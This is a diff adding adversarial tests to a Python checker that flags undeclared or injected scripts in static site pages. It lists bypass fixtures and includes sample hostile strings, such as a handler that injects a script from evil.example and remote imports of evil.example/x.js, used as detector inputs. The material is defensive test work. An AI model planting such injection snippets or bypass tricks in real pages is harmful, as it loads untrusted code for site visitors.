@@ -123,7 +123,7 @@ ADV_EXPECT = {
     'g_unquoted': 'undeclared local script app.js',
     'c_commentedpin': 'no shell runs',
     'd_deep': 'a/b/page.html:1 loads undeclared local script factory-copy.js',
-    'e_dynamic': 'injects a script at runtime',
+    'e_dynamic': 'at runtime',
     'f_keepmut': "keep entry 'gate.js' must be {file, sha256, reason}",
 }
 for name, needle in sorted(ADV_EXPECT.items()):
@@ -221,6 +221,128 @@ with tempfile.TemporaryDirectory() as t:
     # data scripts are not code
     d = room(t, 'ldjson', pinned + '<script type="application/ld+json">{"@type":"WebSite"}</script>', {'base': V})
     r = run(d); ok(r['status'] == 'OK', 'application/ld+json data block = OK')
+
+# ---- C6: Key 2 re-review bypass rooms (test/fixtures/shell_drift/adv2, built by its mk.py) ----
+ADV2 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv2')
+ADV2_EXPECT = {  # room: (status, finding needle, warning needle)
+    'h0_control': ('OK', None, None),
+    'w_emoji': ('WARN', None, 'emoji-picker-element@1 has no SRI'),
+    'h1_upper': ('DRIFT', 'undeclared local script app.js', None),
+    'h2_data': ('DRIFT', 'undeclared remote script data:', None),
+    'h3_srcdoc': ('DRIFT', 'undeclared <iframe srcdoc>', None),
+    'h4_base': ('DRIFT', '<base href=', None),
+    'h5_modimport': ('DRIFT', 'ext/room.js statically imports https://evil.example/x.js', None),
+    'h5b_inlinemod': ('DRIFT', 'inline statically imports https://evil.example/x.js', None),
+    'h6_extrabefore': ('DRIFT', 'undeclared local script pre.js', None),
+    'h7_onerror': ('DRIFT', 'undeclared <img onerror=>', None),
+    'h8_inertpin': ('DRIFT', 'pin is inert (type=text/plain)', None),
+    'h9_templatepin': ('DRIFT', 'pin is inert (inside <template>)', None),
+    'h10_evalfetch': ('DRIFT', 'at runtime (', None),
+    'h11_obf': ('DRIFT', 'at runtime (createElement(t', None),
+    'h12_iframe': ('DRIFT', 'undeclared <a href=javascript:>', 'remote <iframe src=https://evil.example/page.html>'),
+    'h13_worker': ('DRIFT', 'at runtime (new Worker(', None),
+    'h14_nomodule': ('DRIFT', 'pin is inert (nomodule)', None),
+    'h15_php': ('DRIFT', 'page.php:1 loads undeclared local script factory-copy.js', None),
+}
+ok(sorted(ADV2_EXPECT) == sorted(x for x in os.listdir(ADV2) if os.path.isdir(os.path.join(ADV2, x))), 'every adv2 fixture room has an expectation')
+
+
+def adv2(t, name, new=None):
+    d = os.path.join(t, new or name)
+    shutil.copytree(os.path.join(ADV2, name), d)
+    return d
+
+
+def reshell(d, fn):
+    s = json.load(open(os.path.join(d, 'site.json')))
+    fn(s['shell'])
+    json.dump(s, open(os.path.join(d, 'site.json'), 'w'))
+
+
+for name, (st, needle, wneedle) in sorted(ADV2_EXPECT.items()):
+    with tempfile.TemporaryDirectory() as t:
+        r = run(adv2(t, name))
+        good = r['status'] == st and (needle is None or any(needle in x for x in r['findings'])) \
+            and (wneedle is None or any(wneedle in x for x in r['warnings']))
+        ok(good, 'adv2 %s = %s%s (%s %s %s)' % (name, st, ' with "%s"' % needle if needle else '', r['status'], r['findings'], r['warnings']))
+
+with tempfile.TemporaryDirectory() as t:
+    def page(d):
+        return open(os.path.join(d, 'index.html')).read()
+
+    def put(d, html):
+        open(os.path.join(d, 'index.html'), 'w').write(html)
+
+    def ov(d, key, entries):
+        reshell(d, lambda sh: sh.setdefault('overrides', {}).setdefault(key, []).extend(entries))
+
+    def mod(d, **kw):
+        reshell(d, lambda sh: [e.update(kw) for e in sh['overrides']['modules']])
+
+    # h3: srcdoc declared by sha256 in overrides.frames = OK
+    d = adv2(t, 'h3_srcdoc', 'h3_decl')
+    sd = '<script src="https://evil.example/x.js"></script>'
+    ov(d, 'frames', [{'page': 'index.html', 'sha256': sha(sd.encode()), 'reason': 't'}])
+    r = run(d); ok(r['status'] == 'OK', 'srcdoc declared in overrides.frames = OK (%s)' % r['findings'])
+    # h4: <base> cannot be declared; without it the same room is OK; <base target> alone is fine
+    d = adv2(t, 'h4_base', 'h4_nobase'); put(d, page(d).replace('<base href="https://evil.example/">', '<base target="_blank">'))
+    r = run(d); ok(r['status'] == 'OK', 'same room with <base target> only (no href) = OK (%s)' % r['findings'])
+    # h5: remote static import listed in the module's "imports" = OK
+    d = adv2(t, 'h5_modimport', 'h5_decl'); mod(d, imports=['https://evil.example/x.js'])
+    r = run(d); ok(r['status'] == 'OK', 'static remote import listed in module "imports" = OK (%s)' % r['findings'])
+    # h5b: inline module declared with its import listed = OK
+    d = adv2(t, 'h5b_inlinemod', 'h5b_decl')
+    ov(d, 'inline', [{'page': 'index.html', 'sha256': sha(b'import "https://evil.example/x.js"'), 'reason': 't', 'imports': ['https://evil.example/x.js']}])
+    r = run(d); ok(r['status'] == 'OK', 'declared inline module with its import listed = OK (%s)' % r['findings'])
+    # h7: handler declared without "injects" still flags the injection; with "injects" = OK
+    d = adv2(t, 'h7_onerror', 'h7_decl')
+    hv = "var s=document.createElement('script');s.src='https://evil.example/x.js';document.head.appendChild(s)"
+    ov(d, 'inline', [{'page': 'index.html', 'sha256': sha(hv.encode()), 'reason': 't'}])
+    r = run(d); ok(r['status'] == 'DRIFT' and all('undeclared' not in x for x in r['findings']), 'declared on*= handler that injects, no "injects" = DRIFT (injection only)')
+    reshell(d, lambda sh: sh['overrides']['inline'][0].update(injects='t'))
+    r = run(d); ok(r['status'] == 'OK', 'declared on*= handler with "injects" = OK (%s)' % r['findings'])
+    # h8/h9/h14: a pin that runs (type=module) = OK; a pin inside <noscript> = DRIFT
+    d = adv2(t, 'h8_inertpin', 'h8_module'); put(d, page(d).replace('type="text/plain"', 'type="module"'))
+    r = run(d); ok(r['status'] == 'OK', 'pin with type="module" counts = OK (%s)' % r['findings'])
+    d = adv2(t, 'h9_templatepin', 'h9_noscript'); put(d, page(d).replace('template>', 'noscript>'))
+    r = run(d); ok(r['status'] == 'DRIFT' and any('inside <noscript>' in x for x in r['findings']), 'pin inside <noscript> = DRIFT')
+    d = adv2(t, 'h9_templatepin', 'h9_out'); put(d, page(d).replace('<template>', '').replace('</template>', ''))
+    r = run(d); ok(r['status'] == 'OK', 'same pin outside <template> = OK')
+    d = adv2(t, 'h0_control', 'dupsrc'); put(d, page(d).replace('<script src="https://cdn', '<script src="ext/x.js" src="https://cdn'))
+    r = run(d); ok(r['status'] == 'DRIFT' and any('duplicated attributes' in x for x in r['findings']), 'pin tag with a duplicated src (browser uses the first) = DRIFT')
+    # h10/h11/h13: best-effort injection hits clear with a declared "injects" reason
+    for n in ('h10_evalfetch', 'h11_obf', 'h13_worker'):
+        d = adv2(t, n, n + '_decl'); mod(d, injects='reviewed')
+        r = run(d); ok(r['status'] == 'OK', '%s with declared "injects" = OK (%s)' % (n, r['findings']))
+    # h12: frame and javascript: URL both declared = OK; remote iframe alone = WARN
+    d = adv2(t, 'h12_iframe', 'h12_decl')
+    ov(d, 'frames', [{'page': 'index.html', 'src': 'https://evil.example/page.html', 'reason': 't'}])
+    ov(d, 'inline', [{'page': 'index.html', 'sha256': sha(b'javascript:void(0)'), 'reason': 't'}])
+    r = run(d); ok(r['status'] == 'OK', 'remote iframe + javascript: URL both declared = OK (%s %s)' % (r['findings'], r['warnings']))
+    d = adv2(t, 'h12_iframe', 'h12_warn'); put(d, page(d).replace('<a href="javascript:void(0)">x</a>', ''))
+    r = run(d); ok(r['status'] == 'WARN' and not r['findings'], 'undeclared remote iframe alone = WARN')
+    d = adv2(t, 'h0_control', 'frames_bad')
+    put(d, page(d).replace('<script src="ext', '<iframe src="data:text/html,x"></iframe><object data="x.swf"></object><script src="ext'))
+    r = run(d); ok(r['status'] == 'DRIFT' and any('data source' in x for x in r['findings']) and any('undeclared <object>' in x for x in r['findings']),
+                   'data: iframe and undeclared <object> = DRIFT')
+    # h15: the php page with its script declared and present = OK
+    d = adv2(t, 'h15_php', 'h15_decl'); fc = b'window.x=1;\n'; write(d, 'factory-copy.js', fc)
+    reshell(d, lambda sh: sh.setdefault('keep', []).append({'file': 'factory-copy.js', 'sha256': sha(fc), 'reason': 't'}))
+    r = run(d); ok(r['status'] == 'OK', 'php page script declared in keep = OK (%s)' % r['findings'])
+    # svg pages are scanned too
+    d = adv2(t, 'h0_control', 'svg'); write(d, 'img/x.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')
+    r = run(d); ok(r['status'] == 'DRIFT' and any('img/x.svg' in x for x in r['findings']), 'script inside a room .svg = DRIFT')
+    # static local imports: target must be declared; once declared = OK; a static import of a shell file = DRIFT
+    d = adv2(t, 'h0_control', 'locimp')
+    m1 = b"import './util.js';\n" + b(os.path.join(d, 'ext', 'room.js')); write(d, 'ext/room.js', m1); write(d, 'ext/util.js', b'export const x = 1;\n')
+    mod(d, sha256=sha(m1))
+    r = run(d); ok(r['status'] == 'DRIFT' and any('imports undeclared local module ext/util.js' in x for x in r['findings']), 'static import of an undeclared local module = DRIFT')
+    ov(d, 'modules', [{'file': 'ext/util.js', 'sha256': sha(b'export const x = 1;\n'), 'hooks': [], 'load': 'import', 'reason': 't'}])
+    r = run(d); ok(r['status'] == 'OK', 'same import once ext/util.js is declared = OK (%s)' % r['findings'])
+    m2 = b"import 'https://cdn.jsdelivr.net/gh/x/subx-factory@main/factory/factory.js';\n"; write(d, 'ext/util.js', m2)
+    reshell(d, lambda sh: [e.update(sha256=sha(m2), imports=['https://cdn.jsdelivr.net/gh/x/subx-factory@main/factory/factory.js'])
+                           for e in sh['overrides']['modules'] if e['file'] == 'ext/util.js'])
+    r = run(d); ok(r['status'] == 'DRIFT' and any('statically imports a factory/shell file' in x for x in r['findings']), 'static import of a shell file (even if listed) = DRIFT')
 
 print('\n%d failure(s)' % len(fails))
 sys.exit(1 if fails else 0)
